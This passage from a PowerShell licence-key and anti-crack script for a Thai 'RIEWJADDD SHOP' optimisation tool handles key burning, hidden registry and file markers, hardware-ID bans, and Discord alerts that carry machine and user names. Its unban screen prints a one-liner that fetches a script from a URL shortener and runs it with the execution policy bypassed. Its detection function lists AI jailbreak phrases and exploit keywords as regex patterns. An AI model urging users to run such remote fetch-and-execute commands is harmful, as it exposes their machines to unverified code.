    # 5.3 กรณีเคยผูกกับเครื่องนี้ไว้บน Cloud -> เนื่องจากใช้ได้แค่ครั้งเดียว จึงหมดสิทธิ์ใช้งานซ้ำ
    if ($cloudHwid -and $cloudHwid -eq $CurrentHWID) {
        Write-AuthLog -Key $InputKey -Status "EXPIRED" -Owner "Single-Use Customer" -Details "Key already bound to this machine ($CurrentHWID) - Single use exhausted"
        return "EXPIRED"
    }
    
    # 6. คีย์ถูกต้อง และไม่เคยถูกใช้งาน -> อนุญาตให้ใช้งาน และทำการ BURN (ล็อคสถานะเป็น USED ทันที)
    $nowStr = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $ownerNote = if ($localEntry -and $localEntry.note) { $localEntry.note } elseif ($isApproved) { "Pre-Approved Customer" } else { "Licensed Customer" }
    # บันทึกสถานะบน Cloud เป็น USED_<HWID> ทันที เพื่อป้องกันเครื่องอื่นเอาไปกด
    Set-CloudHWID $InputKey "USED_$CurrentHWID" | Out-Null
    # บันทึกสถานะใน Local DB เป็น USED และระบุเวลาที่ใช้งาน
    if (-not $localEntry) {
        $localEntry = @{
            key          = $InputKey
            hwid         = "USED_$CurrentHWID"
            status       = "USED"
            created_on   = $nowStr
            activated_on = $nowStr
            used_on      = $nowStr
            machine_name = $env:COMPUTERNAME
            note         = $ownerNote
        }
        $db.keys += $localEntry
    } else {
        $localEntry.hwid         = "USED_$CurrentHWID"
        $localEntry.status       = "USED"
        $localEntry.activated_on = $nowStr
        $localEntry.used_on      = $nowStr
        $localEntry.machine_name = $env:COMPUTERNAME
    }
    Save-KeyDB $db
    # บันทึก Registry Marker
    try {
        if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
        New-Item -Path "$regPath\$InputKey" -Force | Out-Null
        Set-ItemProperty -Path "$regPath\$InputKey" -Name "HWID" -Value $CurrentHWID -Type String -Force | Out-Null
        Set-ItemProperty -Path "$regPath\$InputKey" -Name "UsedDate" -Value $nowStr -Type String -Force | Out-Null
        Set-ItemProperty -Path "$regPath\$InputKey" -Name "Status" -Value "USED" -Type String -Force | Out-Null
    } catch {}
    # บันทึก Hidden System Marker
    try {
        Add-Content -Path $hiddenMarkerFile -Value $InputKey -Force -Encoding UTF8 -ErrorAction SilentlyContinue
        attrib +h +s $hiddenMarkerFile 2>$null
    } catch {}
    Write-AuthLog -Key $InputKey -Status "ACTIVATED" -Owner $ownerNote -Details "Key newly activated & consumed on hardware $CurrentHWID ($env:COMPUTERNAME)"
    return "ACTIVATED"
}
# -- Admin Panel: Check Banned Machines (Ban Management Dashboard) --
function Show-BannedMachines {
    while ($true) {
        Clear-Host
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = "Red"
        Write-Host "  ================================================================"
        Write-Host "  RIEWJADDD SHOP  -  BANNED MACHINES LIST (ADMIN CONTROL)"
        Write-Host "  ================================================================"
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = "DarkGray"
        Write-Host "  Ban Database File : $BanFilePath"
        Write-Host "  Security Log File : $SecurityLogFile"
        Write-Host ""
        # 1. Aggregate banned machines from Ban DB and Security Logs
        $banMap = [ordered]@{}
        # 1.1 From Ban DB
        $banDb = Load-BanDB
        foreach ($b in $banDb.bans) {
            if ($b.hwid) {
                $banMap[$b.hwid] = [PSCustomObject]@{
                    hwid         = $b.hwid
                    machine_name = if ($b.machine_name) { $b.machine_name } else { "UNKNOWN" }
                    user_name    = if ($b.user_name) { $b.user_name } else { "UNKNOWN" }
                    banned_on    = if ($b.banned_on) { $b.banned_on } else { "N/A" }
                    reason       = if ($b.reason) { $b.reason } else { "CRACK_THREAT" }
                    status       = if ($b.status) { $b.status } else { "BANNED" }
                    source       = "DATABASE"
                }
            }
        }
        # 1.2 From Security Logs
        $secLogFiles = @(
            $SecurityLogFile,
            (Join-Path $BaseDir "GHOST_security.log"),
            (Join-Path $env:ProgramData "RIEWJADDD_SHOP\RIEWJADDD_security.log"),
            (Join-Path $env:ProgramData "RIEWJADDD_SHOP\GHOST_security.log")
        ) | Select-Object -Unique
        foreach ($lf in $secLogFiles) {
            if (Test-Path $lf) {
                try {
                    $raw = Get-Content $lf -Raw -Encoding UTF8
                    $blocks = $raw -split "(?m)^={5,}"
                    foreach ($blk in $blocks) {
                        if ($blk -match 'Offender HWID\s*:\s*([^\r\n]+)') {
                            $hw = $matches[1].Trim()
                            $pc = if ($blk -match 'Machine Name\s*:\s*([^\r\n]+)') { $matches[1].Trim() } else { "UNKNOWN" }
                            $usr = if ($blk -match 'Windows User\s*:\s*([^\r\n]+)') { $matches[1].Trim() } else { "UNKNOWN" }
                            $rs = if ($blk -match 'Threat Reason\s*:\s*([^\r\n]+)') { $matches[1].Trim() } else { "CRACK_THREAT" }
                            $dt = if ($blk -match '\[\s*([0-9\-\s:]+)\s*\]') { $matches[1].Trim() } else { "UNKNOWN_DATE" }
                            if ($hw -ne "UNKNOWN-HWID" -and -not ($DevHWIDs -contains $hw)) {
                                if (-not $banMap.Contains($hw)) {
                                    $banMap[$hw] = [PSCustomObject]@{
                                        hwid         = $hw
                                        machine_name = $pc
                                        user_name    = $usr
                                        banned_on    = $dt
                                        reason       = $rs
                                        status       = "BANNED"
                                        source       = "SECURITY_LOG"
                                    }
                                }
                            }
                        }
                    }
                } catch {}
            }
        }
        $records = @($banMap.Values)
        if ($records.Count -eq 0) {
            $Host.UI.RawUI.ForegroundColor = "Green"
            Write-Host "  [OK] Clean Record! No banned machines currently in system."
            Write-Host "  (All machines are in good standing or bans were unbanned)" -ForegroundColor DarkGray
            Write-Host ""
        } else {
            $Host.UI.RawUI.ForegroundColor = "Yellow"
            Write-Host "  Total Banned / Flagged Records: $($records.Count) machine(s)"
            Write-Host "  ----------------------------------------------------------------"
            $idx = 1
            foreach ($rec in $records) {
                $statusColor = if ($rec.status -eq "UNBANNED") { "Green" } else { "Red" }
                $statusText  = if ($rec.status -eq "UNBANNED") { "[UNBANNED]" } else { "[BANNED]" }
                $Host.UI.RawUI.ForegroundColor = "Cyan"
                Write-Host "  [$idx] HWID: $($rec.hwid)"
                Write-Host "      Status   : " -NoNewline
                Write-Host $statusText -ForegroundColor $statusColor
                $Host.UI.RawUI.ForegroundColor = "DarkGray"
                Write-Host "      Machine  : $($rec.machine_name)  |  User: $($rec.user_name)"
                Write-Host "      Date/Time: $($rec.banned_on)"
                Write-Host "      Reason   : $($rec.reason)"
                Write-Host "  ----------------------------------------------------------------"
                $idx++
            }
        }
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = "White"
        Write-Host "  Available Commands:"
        Write-Host "  [U <number>] Quick Unban by index (e.g. Type 'U 1' to unban #1 immediately)" -ForegroundColor Green
        Write-Host "  [C <HWID>]   Check Cloud Ban status for specified HWID" -ForegroundColor Cyan
        Write-Host "  [B <HWID>]   Manually Ban specified HWID" -ForegroundColor Red
        Write-Host "  [R]          Refresh List" -ForegroundColor Yellow
        Write-Host "  [0]          Return to Admin Panel" -ForegroundColor DarkGray
        Write-Host ""
        $cmd = Read-Host "  Select command or enter number"
        $cmd = "$cmd".Trim()
        if ($cmd -eq "0" -or $cmd -eq "") {
            break
        } elseif ($cmd.ToUpper() -eq "R") {
            continue
        } elseif ($cmd.ToUpper() -like "U *") {
            $targetNum = $cmd.Substring(2).Trim()
            if ($targetNum -as [int] -and [int]$targetNum -ge 1 -and [int]$targetNum -le $records.Count) {
                $chosen = $records[[int]$targetNum - 1]
                $unbanHWID = $chosen.hwid
                Write-Host ""
                Write-Host "  [*] Unbanning HWID: $unbanHWID ..." -ForegroundColor Yellow
                
                Set-CloudHWID "BAN_$unbanHWID" "UNBANNED" | Out-Null
                if ($unbanHWID -eq $CurrentHWID) {
                    Clear-LocalBanMarkers
                }
                
                Record-Ban -Hwid $unbanHWID -MachineName $chosen.machine_name -UserName $chosen.user_name -Reason "UNBANNED_BY_DEV" -Status "UNBANNED"
                
                $unbanLog = @"
================================================================================
[ $((Get-Date).ToString("yyyy-MM-dd HH:mm:ss")) ] [QUICK UNBAN] HWID UNBANNED BY DEV
--------------------------------------------------------------------------------
  Action      : MACHINE UNBANNED VIA QUICK ADMIN PANEL
  Target HWID : $unbanHWID
  Target PC   : $($chosen.machine_name) ($($chosen.user_name))
  Executed By : DEV ($env:USERNAME) on $env:COMPUTERNAME
================================================================================
"@
                try { [System.IO.File]::AppendAllText($ActivationLogFile, $unbanLog, [System.Text.Encoding]::UTF8) } catch {}
                Send-DiscordWebhook -Title "🟢 [RIEWJADDD] Machine Unbanned (Quick Unban)" `
                    -Description "Developer unbanned this machine from Admin Panel." `
                    -Color 65280 `
                    -Fields @(
                        @{ name = "💻 Machine"; value = "$($chosen.machine_name)"; inline = $true },
                        @{ name = "🔒 HWID"; value = ('`' + $unbanHWID + '`'); inline = $false },
                        @{ name = "⏰ Timestamp"; value = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss"); inline = $true }
                    )
                Write-Host ""
                if ($cloudOk) {
                    Write-Host "  [SUCCESS] Machine $unbanHWID has been UNBANNED on Cloud successfully!" -ForegroundColor Green
                } else {
                    Write-Host "  [NOTICE] Cloud KeyAuth server is currently unreachable/503." -ForegroundColor Yellow
                    Write-Host "  Recorded unban in local DB. If customer still sees ban screen, send them this 1-line command:" -ForegroundColor Cyan
                    Write-Host ""
                    Write-Host "powershell -nop -ep bypass -c `"irm tinyurl.com/Riewjadd | iex`"" -ForegroundColor White
                    Write-Host "Or send them RIEWJADDD_UNBAN.ps1 to run once as Administrator." -ForegroundColor DarkGray
                    Write-Host ""
                    Read-Host "  Press Enter to continue"
                }
                Start-Sleep -Seconds 1
            } else {
                Write-Host "  [ERROR] Invalid number." -ForegroundColor Red
                Start-Sleep -Seconds 1
            }
        } elseif ($cmd.ToUpper() -like "C *") {
            $chkHWID = $cmd.Substring(2).Trim().ToUpper()
            Write-Host "  [*] Checking Cloud Ban status..." -ForegroundColor DarkGray
            $status = Get-CloudHWID "BAN_$chkHWID" -Force
            Write-Host ""
            if ($status) {
                Write-Host "  HWID: $chkHWID" -ForegroundColor Cyan
                Write-Host "  Cloud Status: $status" -ForegroundColor Yellow
            } else {
                Write-Host "  HWID: $chkHWID has no ban record on Cloud (Status: Clean / Not Banned)" -ForegroundColor Green
            }
            Write-Host ""
            Read-Host "  Press Enter to continue"
        } elseif ($cmd.ToUpper() -like "B *") {
            $banTarget = $cmd.Substring(2).Trim().ToUpper()
            if ($banTarget.Length -ge 5) {
                Write-Host "  [*] Setting Cloud Ban for HWID: $banTarget ..." -ForegroundColor Red
                Set-CloudHWID "BAN_$banTarget" "BANNED" | Out-Null
                Record-Ban -Hwid $banTarget -MachineName "MANUALLY_BANNED" -UserName "ADMIN" -Reason "MANUAL_DEV_BAN" -Status "BANNED"
                Write-Host "  [OK] HWID $banTarget is now BANNED!" -ForegroundColor Green
                Start-Sleep -Seconds 2
            }
        }
    }
}
# -- Admin Panel (key management) -----------------------
function Show-AdminPanel {
    Clear-Host
    Write-Host ""
    $Host.UI.RawUI.ForegroundColor = "Red"
    Write-Host "  ============================================"
    Write-Host "  RIEWJADDD SHOP  -  ADMIN PANEL (DEV)"
    Write-Host "  ============================================"
    Write-Host ""
    $Host.UI.RawUI.ForegroundColor = "DarkGray"
    Write-Host "  Key File: $KeyFilePath"
    Write-Host "  Your HWID: $CurrentHWID"
    Write-Host ""
    
    while ($true) {
        $cfg = Load-GhostConfig
        $webhookStatus = if ($cfg.discord_webhook -and $cfg.discord_webhook.Trim() -ne "") { "[CONNECTED]" } else { "[NOT CONFIGURED]" }
        $Host.UI.RawUI.ForegroundColor = "Cyan"
        Write-Host "  [1] Generate new key"
        Write-Host "  [2] List all keys"
        Write-Host "  [3] Delete a key"
        Write-Host "  [4] Reset HWID on a key"
        $Host.UI.RawUI.ForegroundColor = "Yellow"
        Write-Host "  [5] Check Banned Machines (List & Quick Unban)"
        $Host.UI.RawUI.ForegroundColor = "Green"
        Write-Host "  [6] Unban Machine by HWID (Manual HWID input)   [DEV EXCLUSIVE]"
        $Host.UI.RawUI.ForegroundColor = "Cyan"
        Write-Host "  [7] View Key Activation Logs    (Category 1: Activations)"
        Write-Host "  [8] View Anti-Crack Logs        (Category 2: Security & Threats)"
        Write-Host "  [9] Discord Webhook Settings   $webhookStatus"
        Write-Host "  [10] Clear Logs"
        Write-Host "  [0] Continue to RIEWJADDD SHOP optimization"
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = "White"
        $choice = Read-Host "  Select option"
        
        switch ($choice) {
            "5" {
                Show-BannedMachines
            }
            "1" {
                $newKey = Generate-KeyString
                $db = Load-KeyDB
                $keyEntry = @{
                    key          = $newKey
                    hwid         = "UNBOUND"
                    status       = "UNBOUND"
                    created_on   = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                    activated_on = ""
                    used_on      = ""
                    machine_name = ""
                    note         = ""
                }
                $Host.UI.RawUI.ForegroundColor = "DarkGray"
                $note = Read-Host "  Note / Customer Name for this key (Enter to skip)"
                if ($note) { $keyEntry.note = $note }
                
                # บันทึกสถานะตั้งต้นใน Cloud เป็น UNBOUND
                Set-CloudHWID $newKey "UNBOUND" | Out-Null
                
                $db.keys += $keyEntry
                Save-KeyDB $db
                
                Write-Host ""
                $Host.UI.RawUI.ForegroundColor = "Green"
                Write-Host "  NEW KEY GENERATED: $newKey"
                Write-Host "  Owner / Note    : $(if ($keyEntry.note) { $keyEntry.note } else { 'N/A' })"
                Write-Host "  Status          : UNBOUND (Single-use: will lock to 1 machine and burn upon use)"
                Write-Host "  Cloud Lock      : ACTIVE (1 Key = 1 Machine / 1-Time Use)" -ForegroundColor Cyan
                Write-Host ""
            }
            "2" {
                Write-Host ""
                $db = Load-KeyDB
                if ($db.keys.Count -eq 0) {
                    $Host.UI.RawUI.ForegroundColor = "Yellow"
                    Write-Host "  No keys in database."
                } else {
                    $Host.UI.RawUI.ForegroundColor = "White"
                    Write-Host "  ---- KEY DATABASE ----"
                    $i = 1
                    foreach ($entry in $db.keys) {
                        $status = if ($entry.status -eq "USED" -or $entry.hwid -like "USED*" -or $entry.used_on) {
                            "USED / EXPIRED ($($entry.hwid))"
                        } elseif ($entry.hwid -eq "UNBOUND" -or -not $entry.hwid) {
                            "UNBOUND (Ready to use)"
                        } else {
                            "BOUND ($($entry.hwid))"
                        }
                        $Host.UI.RawUI.ForegroundColor = "Cyan"
                        Write-Host "  [$i] $($entry.key)"
                        $Host.UI.RawUI.ForegroundColor = "DarkGray"
                        Write-Host "      Owner   : $(if ($entry.note) { $entry.note } else { 'N/A' })"
                        Write-Host "      Status  : $status"
                        Write-Host "      Created : $($entry.created_on)"
                        if ($entry.activated_on) { Write-Host "      Activated: $($entry.activated_on)  [$($entry.machine_name)]" }
                        if ($entry.used_on)      { Write-Host "      Used On  : $($entry.used_on)" }
                        $i++
                    }
                    Write-Host "  ----------------------"
                }
                Write-Host ""
            }
            "3" {
                $db = Load-KeyDB
                if ($db.keys.Count -eq 0) {
                    $Host.UI.RawUI.ForegroundColor = "Yellow"
                    Write-Host "  No keys to delete."
                } else {
                    $Host.UI.RawUI.ForegroundColor = "White"
                    $delKey = Read-Host "  Enter key to delete"
                    $delKey = $delKey.Trim().ToUpper()
                    
                    Set-CloudHWID $delKey "DELETED_KEY" | Out-Null
                    
                    $newKeys = @()
                    $found = $false
                    foreach ($entry in $db.keys) {
                        if ($entry.key -eq $delKey) { $found = $true }
                        else { $newKeys += $entry }
                    }
                    if ($found) {
                        $db.keys = $newKeys
                        Save-KeyDB $db
                        $Host.UI.RawUI.ForegroundColor = "Green"
                        Write-Host "  Key deleted from Local & Cloud."
                    } else {
                        $Host.UI.RawUI.ForegroundColor = "Red"
                        Write-Host "  Key not found."
                    }
                }
                Write-Host ""
            }
            "4" {
                $db = Load-KeyDB
                $Host.UI.RawUI.ForegroundColor = "White"
                $resetKey = Read-Host "  Enter key to reset HWID"
                $resetKey = $resetKey.Trim().ToUpper()
                
                # รีเซ็ตสถานะบน Cloud เป็น UNBOUND ทันที!
                Set-CloudHWID $resetKey "UNBOUND" | Out-Null
                
                # ล้าง Registry Marker และ Hidden File Marker ด้วย
                try {
                    Remove-Item -Path "HKLM:\SOFTWARE\RIEWJADDD_SHOP\UsedKeys\$resetKey" -Force -ErrorAction SilentlyContinue
                    $hiddenMarkerFile = Join-Path $env:ALLUSERSPROFILE ".riewjaddd_used"
                    if (Test-Path $hiddenMarkerFile) {
                        $lines = Get-Content $hiddenMarkerFile -ErrorAction SilentlyContinue | Where-Object { $_ -ne $resetKey }
                        Set-Content -Path $hiddenMarkerFile -Value $lines -Force -Encoding UTF8 -ErrorAction SilentlyContinue
                    }
                } catch {}
                $found = $false
                foreach ($entry in $db.keys) {
                    if ($entry.key -eq $resetKey) {
                        $entry.hwid = "UNBOUND"
                        $entry.status = "UNBOUND"
                        $entry.activated_on = ""
                        $entry.used_on = ""
                        $entry.machine_name = ""
                        $found = $true
                        break
                    }
                }
                Save-KeyDB $db
                
                Write-Host ""
                $Host.UI.RawUI.ForegroundColor = "Green"
                Write-Host "  [OK] HWID RESET SUCCESSFUL!"
                Write-Host "  Key: $resetKey is now UNBOUND on Cloud & Local."
                Write-Host "  Customer can now activate on their new machine." -ForegroundColor Cyan
                Write-Host ""
            }
            "6" {
                Write-Host ""
                $Host.UI.RawUI.ForegroundColor = "Yellow"
                Write-Host "  ============================================"
                Write-Host "  UNBAN MACHINE BY HWID (DEV ONLY)"
                Write-Host "  ============================================"
                $Host.UI.RawUI.ForegroundColor = "White"
                $unbanHWID = Read-Host "  Enter HWID to unban"
                $unbanHWID = $unbanHWID.Trim().ToUpper()
                if (-not $unbanHWID -or $unbanHWID.Length -lt 5) {
                    Write-Host "  [ERROR] Invalid HWID format." -ForegroundColor Red
                } else {
                    Write-Host "  Connecting to Cloud KeyAuth..." -ForegroundColor DarkGray
                    $cloudOk = Set-CloudHWID "BAN_$unbanHWID" "UNBANNED"
                    
                    if ($unbanHWID -eq $CurrentHWID) {
                        Clear-LocalBanMarkers
                    }
                    Record-Ban -Hwid $unbanHWID -MachineName "MANUALLY_UNBANNED" -UserName "ADMIN" -Reason "UNBANNED_BY_DEV" -Status "UNBANNED"
                    $unbanLog = @"
================================================================================
[ $((Get-Date).ToString("yyyy-MM-dd HH:mm:ss")) ] [ADMIN UNBAN] HWID UNBANNED BY DEV
--------------------------------------------------------------------------------
  Action      : MACHINE UNBANNED
  Target HWID : $unbanHWID
  Executed By : DEV ($env:USERNAME) on $env:COMPUTERNAME
================================================================================
"@
                    try { [System.IO.File]::AppendAllText($ActivationLogFile, $unbanLog, [System.Text.Encoding]::UTF8) } catch {}
                    # Send Discord Webhook Notification
                    $discordFields = @(
                        @{ name = "👑 ดำเนินการโดย"; value = "DEV ($($env:USERNAME))"; inline = $true },
                        @{ name = "💻 HWID ที่ได้รับการปลดแบน"; value = ('`' + $unbanHWID + '`'); inline = $false },
                        @{ name = "🌐 สถานะ Cloud Auth"; value = if ($cloudOk) { "✅ ปลดแบนในระบบคลาวด์แล้ว" } else { "⚠️ บันทึกคลาวด์ไม่สำเร็จ" }; inline = $true },
                        @{ name = "⏰ เวลาที่ปลด"; value = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss"); inline = $true }
                    )
                    Send-DiscordWebhook -Title "🟢 [RIEWJADDD] แจ้งเตือน: ปลดแบนสำเร็จเรียบร้อย!" `
                        -Description "ผู้พัฒนา (DEV) ได้ทำการปลดแบนเครื่องลูกค้ารายนี้ออกจากระบบแล้ว ลูกค้าสามารถเปิดโปรแกรมใช้งานได้ตามปกติทันที" `
                        -Color 65280 `
                        -Fields $discordFields
                    Write-Host ""
                    $Host.UI.RawUI.ForegroundColor = "Green"
                    Write-Host "  [SUCCESS] HWID: $unbanHWID UNBANNED!"
                    Write-Host "  - Cloud Ban Status set to 'UNBANNED'."
                    Write-Host "  - Discord Webhook Notification sent."
                    Write-Host "  - Customer can now open and use the script normally." -ForegroundColor Cyan
                    Write-Host ""
                }
            }
            "7" {
                Show-ActivationLogs
            }
            "8" {
                Show-SecurityLogs
            }
            "9" {
                Configure-DiscordWebhook
            }
            "10" {
                Clear-GhostLogs
            }
            "0" { return }
            default {
                $Host.UI.RawUI.ForegroundColor = "Yellow"
                Write-Host "  Invalid option."
                Write-Host ""
            }
        }
    }
}
# -- Log Viewer: Key Activations -------------------------
function Show-ActivationLogs {
    Clear-Host
    Write-Host ""
    $Host.UI.RawUI.ForegroundColor = "Green"
    Write-Host "  ============================================"
    Write-Host "  RIEWJADDD SHOP  -  KEY ACTIVATION LOGS"
    Write-Host "  ============================================"
    Write-Host ""
    $Host.UI.RawUI.ForegroundColor = "DarkGray"
    Write-Host "  Log File: $ActivationLogFile"
    Write-Host ""
    
    if (-not (Test-Path $ActivationLogFile) -or (Get-Item $ActivationLogFile).Length -eq 0) {
        $Host.UI.RawUI.ForegroundColor = "Yellow"
        Write-Host "  No activation logs recorded yet."
    } else {
        $lines = Get-Content $ActivationLogFile -Encoding UTF8
        foreach ($line in $lines) {
            if ($line -match "ACTIVATED") {
                Write-Host $line -ForegroundColor Green
            } elseif ($line -match "VALID") {
                Write-Host $line -ForegroundColor Cyan
            } elseif ($line -match "MASTER") {
                Write-Host $line -ForegroundColor Magenta
            } elseif ($line -match "HWID_MISMATCH") {
                Write-Host $line -ForegroundColor Yellow
            } elseif ($line -match "INVALID") {
                Write-Host $line -ForegroundColor Red
            } elseif ($line -match "^={5,}|^--{5,}") {
                Write-Host $line -ForegroundColor DarkGray
            } else {
                Write-Host $line -ForegroundColor White
            }
        }
    }
    Write-Host ""
    $Host.UI.RawUI.ForegroundColor = "White"
    Read-Host "  Press Enter to return to Admin Panel"
}
# -- Log Viewer: Security / Crack Threats ----------------
function Show-SecurityLogs {
    Clear-Host
    Write-Host ""
    $Host.UI.RawUI.ForegroundColor = "Red"
    Write-Host "  ============================================"
    Write-Host "  RIEWJADDD SHOP  -  SECURITY / CRACK LOGS"
    Write-Host "  ============================================"
    Write-Host ""
    $Host.UI.RawUI.ForegroundColor = "DarkGray"
    Write-Host "  Log File: $SecurityLogFile"
    Write-Host ""
    
    if (-not (Test-Path $SecurityLogFile) -or (Get-Item $SecurityLogFile).Length -eq 0) {
        $Host.UI.RawUI.ForegroundColor = "Green"
        Write-Host "  Clean record! No security threats or crack attempts logged."
    } else {
        $lines = Get-Content $SecurityLogFile -Encoding UTF8
        foreach ($line in $lines) {
            if ($line -match "CRITICAL|BSOD|THREAT|CRACK DETECTED") {
                Write-Host $line -ForegroundColor Red
            } elseif ($line -match "SAFEGUARD") {
                Write-Host $line -ForegroundColor Yellow
            } elseif ($line -match "^={5,}|^--{5,}") {
                Write-Host $line -ForegroundColor DarkGray
            } else {
                Write-Host $line -ForegroundColor White
            }
        }
    }
    Write-Host ""
    $Host.UI.RawUI.ForegroundColor = "White"
    Read-Host "  Press Enter to return to Admin Panel"
}
# -- Discord Webhook Configuration -----------------------
function Configure-DiscordWebhook {
    Clear-Host
    Write-Host ""
    $Host.UI.RawUI.ForegroundColor = "Cyan"
    Write-Host "  ============================================"
    Write-Host "  RIEWJADDD SHOP  -  DISCORD WEBHOOK NOTIFIER"
    Write-Host "  ============================================"
    Write-Host ""
    $cfg = Load-GhostConfig
    $current = if ($cfg.discord_webhook) { $cfg.discord_webhook } else { "(None)" }
    $Host.UI.RawUI.ForegroundColor = "DarkGray"
    Write-Host "  Current Webhook: $current"
    Write-Host ""
    Write-Host "  [1] Enter new Webhook URL"
    Write-Host "  [2] Send Test Notification to Discord"
    Write-Host "  [3] Remove Webhook"
    Write-Host "  [4] Back"
    Write-Host ""
    $Host.UI.RawUI.ForegroundColor = "White"
    $opt = Read-Host "  Select option"
    switch ($opt) {
        "1" {
            $newUrl = Read-Host "  Paste Discord Webhook URL"
            if ($newUrl -and $newUrl.Trim() -ne "") {
                $cfg.discord_webhook = $newUrl.Trim()
                Save-GhostConfig $cfg
                Write-Host ""
                Write-Host "  Webhook saved successfully!" -ForegroundColor Green
                Send-DiscordWebhook -Title "✅ RIEWJADDD Webhook Connected" -Description "ระบบเชื่อมต่อ Discord Webhook สำหรับแจ้งเตือนการใช้งานสำเร็จเรียบร้อย" -Color 65280 -Fields @(@{ name = "💻 เครื่องคอม"; value = $env:COMPUTERNAME; inline = $true }, @{ name = "👤 ผู้ใช้"; value = $env:USERNAME; inline = $true })
                Write-Host "  Test alert sent to Discord channel!" -ForegroundColor Cyan
            }
            Start-Sleep -Seconds 2
        }
        "2" {
            if (-not $cfg.discord_webhook) {
                Write-Host "  No webhook configured!" -ForegroundColor Red
            } else {
                Write-Host "  Sending test embed..." -ForegroundColor Yellow
                Send-DiscordWebhook -Title "🔔 RIEWJADDD SHOP: ข้อความทดสอบ" -Description "นี่คือข้อความทดสอบการแจ้งเตือนจากระบบ RIEWJADDD SHOP" -Color 3066993 -Fields @(@{ name = "📌 สถานะ"; value = "ระบบทำงานปกติ"; inline = $true }, @{ name = "💻 เครื่องคอม"; value = $env:COMPUTERNAME; inline = $true })
                Write-Host "  Test sent!" -ForegroundColor Green
            }
            Start-Sleep -Seconds 2
        }
        "3" {
            $cfg.discord_webhook = ""
            Save-GhostConfig $cfg
            Write-Host "  Webhook removed." -ForegroundColor Yellow
            Start-Sleep -Seconds 1
        }
    }
}
# -- Clear Logs Helper -----------------------------------
function Clear-GhostLogs {
    $Host.UI.RawUI.ForegroundColor = "Yellow"
    Write-Host ""
    $confirm = Read-Host "  Are you sure you want to clear both logs? (Y/N)"
    if ($confirm.ToUpper() -eq "Y") {
        try { Remove-Item $ActivationLogFile -Force -ErrorAction SilentlyContinue } catch {}
        try { Remove-Item $SecurityLogFile -Force -ErrorAction SilentlyContinue } catch {}
        Write-Host "  Logs cleared successfully." -ForegroundColor Green
    }
    Start-Sleep -Seconds 1
}
# -- Draw clean auth screen ------------------------------
function Draw-AuthScreen {
    Clear-Host
    Write-Host ""
    Write-Host "  ┌──────────────────────────────────────────────────────────────┐" -ForegroundColor DarkRed
    Write-Host "  │  ✦ RIEWJADDD SHOP ✦   SYSTEM OPTIMIZATION & AUTHENTICATION   │" -ForegroundColor Red
    Write-Host "  ├──────────────────────────────────────────────────────────────┤" -ForegroundColor DarkRed
    Write-Host "  │  [HWID]   : " -NoNewline -ForegroundColor DarkGray
    Write-Host ("{0,-49}│" -f $CurrentHWID) -ForegroundColor Cyan
    Write-Host "  │  [DEVICE] : " -NoNewline -ForegroundColor DarkGray
    Write-Host ("{0,-49}│" -f $env:COMPUTERNAME) -ForegroundColor White
    Write-Host "  │  [STATUS] : " -NoNewline -ForegroundColor DarkGray
    Write-Host ("{0,-49}│" -f "READY • ENTER YOUR LICENSE KEY") -ForegroundColor Yellow
    Write-Host "  └──────────────────────────────────────────────────────────────┘" -ForegroundColor DarkRed
    Write-Host ""
}
# -- Crack behavior detection (distinguish cracker / AI attacks vs legitimate user) --
function Detect-CrackBehavior {
    param(
        [string]$InputKey,
        [datetime]$InputTime,
        [datetime]$LastInputTime,
        [string[]]$PreviousKeys
    )
    
    if (Is-DevMachine) { return @() }
    
    $reasons = @()
    
    # 1. Command Injection / Shell Metacharacters
    if ($InputKey -match '[;&|`$\{\}\[\]<>\\]') {
        $reasons += "INJECTION_ATTEMPT"
    }
    
    # 2. AI Jailbreak & Prompt Injection Attack Keywords
    $aiJailbreakRegex = '(?i)(JAILBREAK|DAN\b|STAN\b|AIM\b|DUDE\b|BETTERDAN|UNRESTRICTED|DEVELOPER_MODE|DEV_MODE|IGNORE_PREVIOUS|DISREGARD|PRETEND|SIMULATE|HYPOTHETICAL|ROLEPLAY|ACT_AS|SYSTEM_PROMPT|PROMPT_LEAK|REVEAL_PROMPT|PRINT_PROMPT|NEW_INSTRUCTIONS|OUTPUT_RULES|UNFILTERED|UNCENSORED|ROOT_ACCESS|GOD_MODE)'
    if ($InputKey -match $aiJailbreakRegex) {
        $reasons += "AI_JAILBREAK_INJECTION"
    }
    
    # 3. Exploit, Reverse-Engineering & Memory Cracking Payloads
    $exploitRegex = '(?i)(FORCE_TRUE|BYPASS_AUTH|0x1337|AST_DUMP|MEMORY_HOOK|PRINT_KEY|ADMIN_BYPASS|DEV_OVERRIDE|SKIP_HWID|HWID_SPOOF|EXTRACT_PAYLOAD|DECRYPT_AES|GET_KEYBYTES|INVOKE_PROTECTED|DEOBFUSCAT|INLINE_HOOK|DETOUR|DUMP_MEMORY|GET_PROCESS|MINHOOK|VIRTUALPROTECT|READPROCESSMEMORY|WRITEPROCESSMEMORY|DOWNLOADSTRING|IEX\b|IWR\b|IRM\b|INVOKE-EXPRESSION|SYSTEM\.REFLECTION|SCRIPTBLOCK)'
    if ($InputKey -match $exploitRegex) {
        $reasons += "EXPLOIT_CRACK_PAYLOAD"
    }
    
    # 4. Obfuscation & Smuggling (Base64, Hex payloads, Rot13)
    if ($InputKey -match '(?i)(frombase64string|0x[0-9a-f]{4,}|%[0-9a-f]{2}|base64|rot13|char\[\])') {
        $reasons += "OBFUSCATED_SMUGGLING"
    }
    
    # 5. Buffer overflow attempt (> 50 chars, genuine keys are strictly 23 chars)
    if ($InputKey.Length -gt 50) {
        $reasons += "OVERFLOW_ATTEMPT"
    }
    
    # 6. Automated Brute-Force / Rapid Fire Tool Submission (< 250ms)
    if ($LastInputTime -and $LastInputTime -ne [datetime]::MinValue) {
        $diffMs = ($InputTime - $LastInputTime).TotalMilliseconds
        if ($diffMs -lt 250) {
            $reasons += "AUTOMATED_BRUTE_FORCE"
        }
    }
    
    return $reasons
}
# ========================================================
# EXECUTE ALL ANTI-CRACK CHECKS BEFORE AUTH
# ========================================================
# CHECK 0: Is this machine permanently banned?
if (Check-Banned) {
    Clear-Host
    Write-Host ""
